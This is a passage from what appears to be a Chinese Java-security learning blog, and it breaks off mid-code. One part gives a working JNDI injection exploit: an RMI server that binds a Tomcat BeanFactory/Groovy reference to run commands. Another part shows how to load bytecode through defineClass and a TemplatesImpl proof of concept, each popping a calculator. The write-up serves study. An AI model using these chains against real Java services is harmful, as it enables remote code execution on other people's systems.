operator">-</span>catalina<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">8.5</span><span class="token number">.0</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">&gt;</span></span>    <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">&gt;</span></span>org<span class="token punctuation">.</span>codehaus<span class="token punctuation">.</span>groovy<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">&gt;</span></span>groovy<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">&gt;</span>    <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">&gt;</span></span><span class="token number">2.4</span><span class="token number">.5</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接给出exp：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">ReferenceWrapper</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">ResourceRef</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">NamingException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">javax<span class="token punctuation">.</span>naming<span class="token punctuation">.</span></span><span class="token class-name">StringRefAddr</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">AlreadyBoundException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span></span><span class="token class-name">RemoteException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">LocateRegistry</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>rmi<span class="token punctuation">.</span>registry<span class="token punctuation">.</span></span><span class="token class-name">Registry</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HighRMIServer2</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">NamingException</span><span class="token punctuation">,</span> <span class="token class-name">RemoteException</span><span class="token punctuation">,</span> <span class="token class-name">AlreadyBoundException</span> <span class="token punctuation">{</span>        <span class="token class-name">Registry</span> registry <span class="token operator">=</span> <span class="token class-name">LocateRegistry</span><span class="token punctuation">.</span><span class="token function">createRegistry</span><span class="token punctuation">(</span><span class="token number">6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ResourceRef</span> resourceRef <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ResourceRef</span><span class="token punctuation">(</span><span class="token string">"groovy.lang.GroovyClassLoader"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span><span class="token string">"org.apache.naming.factory.BeanFactory"</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"forceString"</span><span class="token punctuation">,</span> <span class="token string">"m1yuu=parseClass"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        resourceRef<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">StringRefAddr</span><span class="token punctuation">(</span><span class="token string">"m1yuu"</span><span class="token punctuation">,</span><span class="token string">"@groovy.transform.ASTTest(value={\nassert java.lang.Runtime.getRuntime().exec(\"calc\")\n})\ndef m1yuu\n"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ReferenceWrapper</span> referenceWrapper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ReferenceWrapper</span><span class="token punctuation">(</span>resourceRef<span class="token punctuation">)</span><span class="token punctuation">;</span>        registry<span class="token punctuation">.</span><span class="token function">bind</span><span class="token punctuation">(</span><span class="token string">"exp"</span><span class="token punctuation">,</span> referenceWrapper<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行的参数（valueArray[0]）为</p><p><img src="https://s2.loli.net/2022/04/02/S78N6t1DlC4xGdP.png" alt="image-20220402221803017"></p><h3 id="后续更多利用"><a href="#后续更多利用" class="headerlink" title="后续更多利用"></a>后续更多利用</h3><p>浅蓝师傅前段时间发了一篇<a href="https://tttang.com/archive/1405/"><strong>探索高版本 JDK 下 JNDI 漏洞的利用方法</strong></a>，里面详细介绍了更多可利用的类。（不愧是大佬，一找就是十几个），如果对本文进行总结的话，只是讲述了利用RMI进行JNDI注入从0到0.1，后面还有很大空间等待读者们自行去寻找可利用的类。</p><p>reference：</p><p><a href="https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/hello/hello-world.html">https://docs.oracle.com/javase/7/docs/technotes/guides/rmi/hello/hello-world.html</a></p><p><a href="https://blog.csdn.net/u010430304/article/details/54601302">https://blog.csdn.net/u010430304/article/details/54601302</a></p><p><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/index.html">https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/index.html</a></p><p><a href="https://xz.aliyun.com/t/8214">https://xz.aliyun.com/t/8214</a></p><p><a href="https://tttang.com/archive/1405/">https://tttang.com/archive/1405/</a></p><p><a href="https://xz.aliyun.com/t/10671">https://xz.aliyun.com/t/10671</a></p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java安全 </tag>
            
            <tag> 学习记录 </tag>
            
            <tag> java web </tag>
            
            <tag> doc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java_web学习之路(二)：JavaByteCode从烧0到1</title>
      <link href="/2022/03/23/javabytecode/"/>
      <url>/2022/03/23/javabytecode/</url>
      
        <content type="html"><![CDATA[<h1 id="JavaByteCode-从烧0到1"><a href="#JavaByteCode-从烧0到1" class="headerlink" title="JavaByteCode 从烧0到1"></a>JavaByteCode 从烧0到1</h1><h2 id="字节码简介"><a href="#字节码简介" class="headerlink" title="字节码简介"></a>字节码简介</h2><p><strong>Java 字节码</strong>（英语：Java bytecode）是<a href="https://zh.wikipedia.org/wiki/Java%E8%99%9A%E6%8B%9F%E6%9C%BA">Java虚拟机</a>执行的一种<a href="https://zh.wikipedia.org/wiki/%E6%8C%87%E4%BB%A4">指令</a>格式。大多数<a href="https://zh.wikipedia.org/w/index.php?title=%E6%93%8D%E4%BD%9C%E7%A0%81&amp;action=edit&amp;redlink=1">操作码</a>都是一个<a href="https://zh.wikipedia.org/wiki/%E5%AD%97%E8%8A%82">字节</a>长，而有些操作需要参数，导致了有一些多字节的操作码。而且并不是所有可能的256个操作码都被使用；其中有51个操作码被保留做将来使用。除此之外，原始<a href="https://zh.wikipedia.org/wiki/Java%E5%B9%B3%E5%8F%B0">Java平台</a>开发商，<a href="https://zh.wikipedia.org/wiki/%E6%98%87%E9%99%BD%E5%BE%AE%E7%B3%BB%E7%B5%B1">太阳微系统</a>，额外保留了3个代码永久不使用。（来源：wiki</p><p>我们写完.java文件后，使用javac进行编译，便溢出来的.class文件储存的就是Java字节码。JVM运行的就是这些.class字节码，所以Java语言的优势也在于不管平台是什么，CPU等硬件状态如何，开发者只需要使用javac编译成字节码就可以在JVM中运行。</p><p>同时，JVM能加载的字节码不一定需要是javac编译的.class文件，任何语言，只要能将代码编译成.class文件，都可以在JVM虚拟机中运行。比如scala，Groovy，kotlin等。</p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>在之前的文章中我们有提到过，JVM是依靠ClassLoader加载javac编译的.class字节码文件来运行代码，URLClassLoader这个类是平时默认使用的 <code>AppClassLoader</code> 的父类。Java会根据sun.boot.class.path、java.class.path中列举到的路径去寻找.class文件来进行加载。这些路径实际上就是Java的java.net.URL实例化的对象，这些路径分为三个情况：</p><ul><li>URL 未以 斜杠/ 结尾，则认为是一个JAR 文件，使用 JARLoader 寻找类，即在 Jar包中寻找.class 文件。</li><li>URL 以斜杠 / 结尾，且协议名为 <code>file</code>，则使用<code>FileLoader</code> 来寻找类，即在本地文件系统中寻找 .class 文件。</li><li>URL 以斜杠 / 结尾，且协议名不为 <code>file</code>，则使用最基础的 Loader 来寻找类。</li></ul><h2 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h2><p>在ClassLoader加载字节码的过程中，具体的流程如下：</p><blockquote><p>ClassLoader#loadClass–&gt;ClassLoader#findClass–&gt;ClassLoader#defineClass</p></blockquote><p>ClassLoader#defineClass的作用是处理前面传入的字节码，将其变成真正的java类。也是整个流程的核心方法。并且他是一个native方法，定义在JVM的c语言代码中</p><p>我们尝试去使用defineClass方法加载一个编译好的.class文件</p><p>首先定义一个类，实现弹计算器的方法</p><p>Calc.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>p</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">Serializable</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Calc</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token class-name">Calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"open /System/Applications/Calculator.app"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再将Calc.java编译后生成的Calc.class字节码文件转换为base64:</p><p>Base64File.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>p</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">InputStream</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Base64File</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">Object</span> calc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Calc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> barr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InputStream</span> ios <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"/Users/m1saka/Code/java/IdeaProjects/javatest/target/classes/com/p/Calc.class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> temp <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>temp <span class="token operator">=</span> ios<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            barr<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encodeToString</span><span class="token punctuation">(</span>barr<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>生成的base64为</p><pre class="line-numbers language-java" data-language="java"><code class="language-java">yv66vgAAADQAKAoACAAYCgAZABoIABsKABkAHAcAHQoABQAeBwAfBwAgBwAhAQAGPGluaXQ<span class="token operator">+</span><span class="token class-name">AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAMTGNvbS9wL0NhbGM7AQANU3RhY2tNYXBUYWJsZQcAHwcAHQEAClNvdXJjZUZpbGUBAAlDYWxjLmphdmEMAAoACwcAIgwAIwAkAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAwAJQAmAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAJwALAQAKY29tL3AvQ2FsYwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAQAJAAAAAQABAAoACwABAAwAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAA0AAAAaAAYAAAAIAAQACgANAA0AEAALABEADAAVAA4ADgAAABYAAgARAAQADwAQAAEAAAAWABEAEgAAABMAAAAQAAL</span><span class="token operator">/</span><span class="token class-name">ABAAAQcAFAABBwAVBAABABYAAAACABc</span><span class="token operator">=</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后使用defineClass方法去处理字节码：</p><p>DefineClassDemo.java</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>p</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DefineClassDemo</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>        <span class="token class-name">Method</span> defineClass <span class="token operator">=</span> <span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"defineClass"</span><span class="token punctuation">,</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        defineClass<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">"yv66vgAAADQAKAoACAAYCgAZABoIABsKABkAHAcAHQoABQAeBwAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9pby9JT0V4Y2VwdGlvbjsBAAR0aGlzAQAMTGNvbS9wL0NhbGM7AQANU3RhY2tNYXBUYWJsZQcAHwcAHQEAClNvdXJjZUZpbGUBAAlDYWxjLmphdmEMAAoACwcAIgwAIwAkAQAob3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcAwAJQAmAQATamF2YS9pby9JT0V4Y2VwdGlvbgwAJwALAQAKY29tL3AvQ2FsYwEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZhL2lvL1NlcmlhbGl6YWJsZQEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAQAJAAAAAQABAAoACwABAAwAAAB8AAIAAgAAABYqtwABuAACEgO2AARXpwAITCu2AAaxAAEABAANABAABQADAA0AAAAaAAYAAAAIAAQACgANAA0AEAALABEADAAVAA4ADgAAABYAAgARAAQADwAQAAEAAAAWABEAEgAAABMAAAAQAAL/ABAAAQcAFAABBwAVBAABABYAAAACABc="</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> calc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">)</span> defineClass<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span><span class="token class-name">ClassLoader</span><span class="token punctuation">.</span><span class="token function">getSystemClassLoader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">null</span><span class="token punctuation">,</span> code<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> code<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>        calc<span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到运行之后成功触发并弹出了了计算器</p><p><img src="https://s2.loli.net/2022/03/24/uKkpF1Ay8QW2tTX.png" alt="image-20220324195124837"></p><p>注意一点，在 defineClass 被调用的时候，类对象是不会被初始化的，只有这个对象显式地调用其构造 函数，初始化代码才能被执行。而且，即使我们将初始化代码放在类的static块中(在本系列文章第一篇 中进行过说明)，在 defineClass 时也无法被直接调用到。所以，如果我们要使用 defineClass 在目 标机器上执行任意代码，需要想办法调用构造函数。</p><h2 id="TemplatesImpl加载字节码"><a href="#TemplatesImpl加载字节码" class="headerlink" title="TemplatesImpl加载字节码"></a><strong>TemplatesImpl加载字节码</strong></h2><p>我们上面也说过，defineClass方法是一个native方法，由JVM的底层c语言实现，所以一般上层开发者没人会闲的无聊使用他，但是TemplatesImpl类中有使用到defineClass方法，成为我们重视的对象。</p><p>我们去TemplatesImpl类中搜寻defineClass方法，可以看到在一个内部类TransletClassLoader中重写了defineClass方法。</p><p><img src="https://s2.loli.net/2022/03/24/7lcfXFLuEqyGS9e.png"></p><p>接着我们去寻找调用，在defineTransletClasses方法中我们看到这里调用了defineClass。</p><p><img src="https://s2.loli.net/2022/03/24/DimvdMk5jyQPJEh.png" alt="image-20220324202449534"></p><p>我们往上走，找可以利用的public类：</p><p>defineTransletClasses&lt; - - -getTransletInstance&lt; - - -newTransformer</p><p>到了newTransformer这里我们看到，他的声明类型是public，可以被外部调用。我们使用newTransformer构造一个poc：</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>p</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DefineClassDemo</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span><span class="token class-name">String</span> fieldname<span class="token punctuation">,</span><span class="token class-name">Object</span> value<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">{</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>fieldname<span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span>value<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> code <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getDecoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">decode</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TemplatesImpl</span> tem <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>tem<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span>code<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>tem<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>tem<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">TransformerFactoryImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tem<span class="token punctuation">.</span><span class="token function">newTransformer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>有一个细节：TemplatesImpl对于加载的字节码有一定要求，需要继承于com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 。所以我们需要修改原来的Calc类，使其继承自com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 。</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>p</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span>DOM<span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token 